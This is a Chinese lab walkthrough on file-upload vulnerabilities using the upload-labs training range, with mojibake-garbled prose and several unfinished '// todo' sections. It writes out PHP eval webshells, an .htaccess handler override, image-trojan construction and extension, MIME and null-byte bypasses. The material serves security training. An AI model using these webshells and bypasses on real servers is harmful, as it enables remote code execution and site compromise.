---
slug: /net-security/08/01
---

## æ¦‚å¿µ

æ–‡ä»¶ä¸Šä¼ æ˜¯å¸¸ç”¨åŠŸèƒ½ï¼Œä½†æ¶æ„æ–‡ä»¶çš„ä¸Šä¼ ä¼šå½¢æˆæ¼æ´ã€‚

ä¸»è¦å½¢æˆæ˜¯ï¼šåç«¯æ¥å—äº†æ¶æ„æ–‡ä»¶ä¸Šä¼ å¹¶ä¿å­˜ï¼Œå—å®³è€…è®¿é—®è¯¥æ¶æ„æ–‡ä»¶æ—¶ï¼Œå…¶ä¸­çš„æ¶æ„ä»£ç è¢« Web å®¹å™¨æ‰§è¡Œã€‚

<br />

å¸¸è§åœºæ™¯ï¼š

1. ä¸Šä¼ å¤´åƒ

2. ä¸Šä¼ ç›¸å†Œ

3. ä¸Šä¼ é™„ä»¶

4. æ·»åŠ æ–‡ç« å›¾ç‰‡

5. å‰å°ç•™è¨€èµ„æ–™ä¸Šä¼ 

6. ç¼–è¾‘å™¨æ–‡ä»¶ä¸Šä¼ 

7. ###### â€¦â€¦

<br />

å®‰è£…é¶åœº

```bash
docker pull cuer/upload-labs
docker run -d -p 8082:80 --name upload-labs cuer/upload-labs
```



## å®¢æˆ·ç«¯ - JS ç»•è¿‡

### ç¦ç”¨ JavaScript

æ‰“å¼€é¶åœºçš„ Pass-01ï¼Œç‚¹å‡»å³ä¸Šè§’ã€ŒæŸ¥çœ‹æºç ã€ï¼Œè¿™é‡Œçš„æ–‡ä»¶ä¸Šä¼ å­˜åœ¨ JS é™åˆ¶ï¼Œå¹¶ä¸”åªå…è®¸ `.jpg`, `.png`, `.gif`

```php
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!");
        return false;
    }
    //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹
    var allow_ext = ".jpg|.png|.gif";
    //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹
    var ext_name = file.substring(file.lastIndexOf("."));
    //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ 
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ " + allow_ext + "ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

åœ¨ä¸Šä¼ å‰å…ˆç¦ç”¨æ‰ JavaScript

![](http://img.wukaipeng.com/2023/1017-075949-image-20231017075948931.png)

é¦–å…ˆæˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ `info.php`ï¼Œå†…å®¹æ˜¯è¾“å‡º php ä¿¡æ¯ï¼š

```php
<?php phpinfo(); ?>
```

![](http://img.wukaipeng.com/2023/10/19-070309-image-20231019070309633.png)æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸Šä¼  `get.php`ï¼Œç›´æ¥ç”¨å‚æ•°æ§åˆ¶è¾“å‡º

```php
<?php eval(@$_GET['cmd']); ?>
```

![](http://img.wukaipeng.com/2023/10/19-071303-image-20231019071303290.png)

### ä¿®æ”¹åç¼€å

å…ˆæŠŠ `get.php` ä¿®æ”¹ä¸ºç¬¦åˆä¸Šä¼ è¦æ±‚ ğŸ‘‰ `get.png`ï¼Œç„¶åç”¨ Burp æŠ“åŒ…æ”¹å›åŸæ¥çš„ `get.php`

![](http://img.wukaipeng.com/2023/10/19-071741-image-20231019071740872.png)



### ä¿®æ”¹å‰ç«¯ä»£ç 

åˆ é™¤ `onsubmit` æ–¹æ³•ï¼Œè¿™ç§æ–¹å¼ä»…åœ¨ FireFox ç”Ÿæ•ˆï¼š

![](http://img.wukaipeng.com/2023/10/19-072230-image-20231019072230409.png)

## æœåŠ¡ç«¯ - é»‘åå•ç»•è¿‡

### ç‰¹æ®Šåç¼€

åœ¨ Pass-03ï¼Œè¿™é‡Œåç«¯æ— æ³•ä¸Šä¼ çš„é»‘åå•åŒ…æ‹¬ `.asp`, `.aspx`, `.php`, `.jsp`ã€‚



```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
```

å¯ä»¥ä½¿ç”¨å…¶ä»–åç¼€ï¼Œæ¯”å¦‚ï¼š`.phtml`, `.phps`, `php5`, `.pht`

> è¿™äº›åç¼€æ–‡ä»¶éœ€è¦è¢«æ‰§è¡Œçš„è¯æœ‰å‰ææ¡ä»¶æ˜¯ï¼Œ Apache éœ€è¦åšä¸€äº›é…ç½®ä»£ç 

### å¤§å°å†™ç»•è¿‡

åœ¨ Pass-06ï¼Œä¸Šä¼  `get.PHP` å°±èƒ½ç»•è¿‡

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
```

### ç‚¹ç»•è¿‡

åœ¨ Pass-08ï¼Œä¸Šä¼  `get.php.` å¯ä»¥ç»•è¿‡

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
```

### ç©ºæ ¼ç»•è¿‡

åœ¨ Pass-07 ä¸­ï¼Œå¯ä»¥åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ ç©ºæ ¼ `get.php ` ç»•è¿‡ã€‚

ç©ºæ ¼ç»•è¿‡è¿™ç§æ–¹å¼ä»…é€‚ç”¨äº Windows ç³»ç»Ÿï¼Œå› ä¸º Windows ä¼šå»é™¤æ–‡ä»¶å‰åç©ºæ ¼ï¼Œæ‰èƒ½è®¿é—®å¾—åˆ°ã€‚

### `::data` ç»•è¿‡

Windows ä¸­ï¼Œå¦‚æœ æ–‡ä»¶å + `::$DATA` ä¼šæŠŠ `::$DATA` ä¹‹åçš„æ•°æ®å½“åšæ–‡ä»¶æµå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ `::$DATA` ä¹‹å‰çš„æ–‡ä»¶åã€‚ä½¿ç”¨ã€‚

åœ¨ Pass-08 ä¸­å¯ä½¿ç”¨

![](http://img.wukaipeng.com/2023/10/21-163600-image-20231021163559755.png)

ä¸è¿‡ç”±äº Linux æ— æ³•è§£æ `http://175.178.126.31:8082/upload/get.php::data`ï¼Œè®¿é—®ä¸åˆ°ï¼Œä½†æ˜¯æ–‡ä»¶æ˜¯å·²ç»ä¸Šä¼ äº†ã€‚



### é…åˆè§£æç»•è¿‡

åœ¨ Pass-10 ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä»£ç å¾ˆä¸¥æ ¼ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªæ¼æ´å°±æ˜¯åªåšäº†ä¸€æ¬¡æ ¡éªŒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸Šä¼ æ³¨å…¥ `get.php. .` æ¥è¿›è¡Œç»•è¿‡ã€‚

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
```



.htaccess ç»•è¿‡

`.htaccess` æ–‡ä»¶ï¼Œï¼ˆHypertex Accessè¶…æ–‡æœ¬ï¼‰å…¥å£æ˜¯ Apache çš„é…ç½®æ–‡ä»¶ï¼Œç”¨äºæ‰§è¡Œç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚

åœ¨ Upload-04 ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼  `.htaccess` æ–‡ä»¶

å‡†å¤‡ä¸¤ä¸ªæ–‡ä»¶ `.htaccess` å’Œ `wukaipeng.png`ï¼š

```xml
<!-- .htaccessæ–‡ä»¶ -->
<FilesMatch "wukaipeng.jpg">
Sethandler application/x-httpd-php
</FilesMatch>
```

```php
/* wukaipeng.png */
<?php eval(@$_POST['cmd']); ?>
```



ç„¶ååˆ†åˆ«ä¸Šä¼ ï¼Œä¹‹ååœ¨èšå‰‘æµ‹è¯•é“¾æ¥

![](http://img.wukaipeng.com/2023/10/21-171404-image-20231021171404530.png)



### åŒå†™ç»•è¿‡

åœ¨ pass-11 ä¸­ï¼Œå¯ä»¥åˆ©ç”¨åŒå†™åç¼€ç»•è¿‡ï¼Œæ¯”å¦‚ `info.php` ğŸ‘‰ `info.pphphp`



## æœåŠ¡ç«¯ - ç™½åå•ç»•è¿‡

### MIME ç±»å‹ç»•è¿‡

åœ¨ pass-02 ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ `Content-Type` æ¥ç»•è¿‡

![](http://img.wukaipeng.com/2023/10/22-091351-image-20231022091351272.png)

### 00 æˆªæ–­ç»•è¿‡

00 æˆªæ–­ç»•è¿‡æ˜¯ç³»ç»Ÿæ¼æ´ï¼Œæ“ä½œç³»ç»Ÿåº•å±‚æ˜¯ C è¯­è¨€ or æ±‡ç¼–è¯­è¨€çš„ï¼Œè¿™ä¸¤ç§è¯­è¨€éƒ½ä»¥ `\0` ä½œä¸ºå­—ç¬¦ä¸²çš„ç»“æŸæ ‡å¿—ã€‚00 æˆªæ–­æ˜¯æŒ‡æ’å…¥ `\0`ï¼Œä»è€Œè¾¾åˆ°å­—ç¬¦ä¸²æˆªæ–­çš„ç›®çš„ã€‚

`\0` æ˜¯ ASCII ç è¡¨ä¸­çš„ç¬¬ 0 ä¸ªå­—ç¬¦ï¼Œè‹±æ–‡åä¸º `NUL`ã€‚`\0` æ˜¯åœ¨åº•å±‚æ“ä½œç³»ç»Ÿçš„è¡¨ç°å½¢å¼ï¼Œåœ¨å‰ç«¯è¾“å…¥ä¸èƒ½ç›´æ¥è¾“å…¥ `\0`ï¼Œè€Œåº”è¯¥ä½¿ç”¨ `%00` æˆ–è€… `0x00`ï¼š

`%00`ï¼šURL ä¸­ `%00` è¡¨ç¤º ASCII ç ä¸º `0` çš„å­—ç¬¦ï¼Œè¯¥å­—ç¬¦ä¸ºç‰¹æ®Šå­—ç¬¦ä¿ç•™ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸã€‚å½“ URL å‡ºç° `%00` æ—¶å°±è®¤ä¸ºè¯»å–å·²ç»ç»“æŸï¼Œè€Œå¿½ç•¥åé¢ä¸Šä¼ çš„æ–‡ä»¶æˆ–å›¾ç‰‡ï¼Œåªä¸Šä¼ æˆªæ–­å‰çš„æ–‡ä»¶ã€‚

`0x00`ï¼š`%00` è§£ç æˆåå…­è¿›åˆ¶å½¢å¼ã€‚





ä¸‹è½½ Ubuntu 22ï¼š[Download Ubuntu Desktop](https://ubuntu.com/download/desktop)

åœ¨ UTM ä¸Šå®‰è£…ï¼š[Ubuntu 22.04 Guide](https://docs.getutm.app/guides/ubuntu/)

Linux ä¸­å®‰è£…å°çš®é¢æ¿ï¼š[phpstudy-linuxé¢æ¿(å°çš®é¢æ¿)](https://www.xp.cn/linux.html#install-show)







## æœåŠ¡ç«¯ - å†…å®¹ç»•è¿‡

### æ–‡ä»¶å¤´æ£€æŸ¥

ä¸‹é¢æ–‡ä»¶å¤´çš„æ ¼å¼æ˜¯åå…­è¿›åˆ¶ï¼š

- .jpg:  `FF D8 FF E0 00 10 4A 46 49 46`
- .gif: `47 49 46 38 39 61`
- .png: `89 50 4E 47`

Mac ä¸‹ä½¿ç”¨ Hex Friendï¼ˆ[http://hexfiend.com/](http://hexfiend.com/)ï¼‰ æŸ¥çœ‹ä¸€å¼  png çš„åå…­è¿›åˆ¶ï¼š

![](http://img.wukaipeng.com/2023/10/23-065115-image-20231023065115774.png)

ğŸ´ åˆ¶ä½œ**å›¾ç‰‡é©¬**ï¼š

åœ¨ Hex Friend ä¸­æ‰“å¼€ä¸€å¼ çœŸå®å›¾ç‰‡ï¼Œåœ¨æœ€ååŠ ä¸Šä¸€å¥è¯æœ¨é©¬

```php
<?php eval(@$_POST['cmd']); ?>
```

![](http://img.wukaipeng.com/2023/10/23-065955-image-20231023065955668.png)

åœ¨ Pass-13 ä¸Šä¼ å›¾ç‰‡ï¼Œå¹¶è·å–å›¾ç‰‡çš„ URL

// todo

è®¿é—®ï¼š`http://YOUR_IP_ADDRESS:PORT/include.php?file=IMAGE_URL`

// todo

ğŸ´ åˆ¶ä½œå›¾ç‰‡é©¬çš„å¦å¤–ä¸€ç§æ–¹å¼ï¼šç›´æ¥è®¾ç½®æ–‡ä»¶å¤´ï¼Œç„¶åå†™ä¸Šä¸€å¥è¯æœ¨é©¬

> è¿™ç§æ–¹å¼ä¸¥æ ¼ä¸Šä¸ç®—å›¾ç‰‡é©¬



### çªç ´ getimagesize åŠ exif_imagetype

åœ¨ pass-15 ä¸­ï¼Œå’Œæ–‡ä»¶å¤´æ£€æŸ¥ä¸ä¸€æ ·ï¼Œåˆ¤æ–­æ–‡ä»¶ä»£ç æ˜¯ç”¨ `getimagesize()` åˆ¤æ–­å›¾ç‰‡ï¼Œå³è·å–å›¾ç‰‡çš„é•¿åº¦å’Œé«˜åº¦ç­‰æ¥åˆ¤æ–­æ˜¯å¦æ˜¯å›¾ç‰‡ã€‚

// todo



åœ¨ pass-16 ä¸­ï¼Œ`exif_imagetype()` è¯»å–ç¬¬ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚

// todo

å¯¹äº pass-15 å’Œ pass-16ï¼Œæˆ‘ä»¬åªéœ€è¦ç”¨çœŸå®çš„å›¾ç‰‡æ¥åˆ¶ä½œæœ¨é©¬ï¼Œå¹¶ä¸”æ”»å‡»æ–¹å¼å’Œä¸Šä¸€å°èŠ‚ä¸€è‡´ï¼Œè¿™é‡Œå¿½ç•¥ã€‚



### äºŒæ¬¡æ¸²æŸ“ç»•è¿‡

















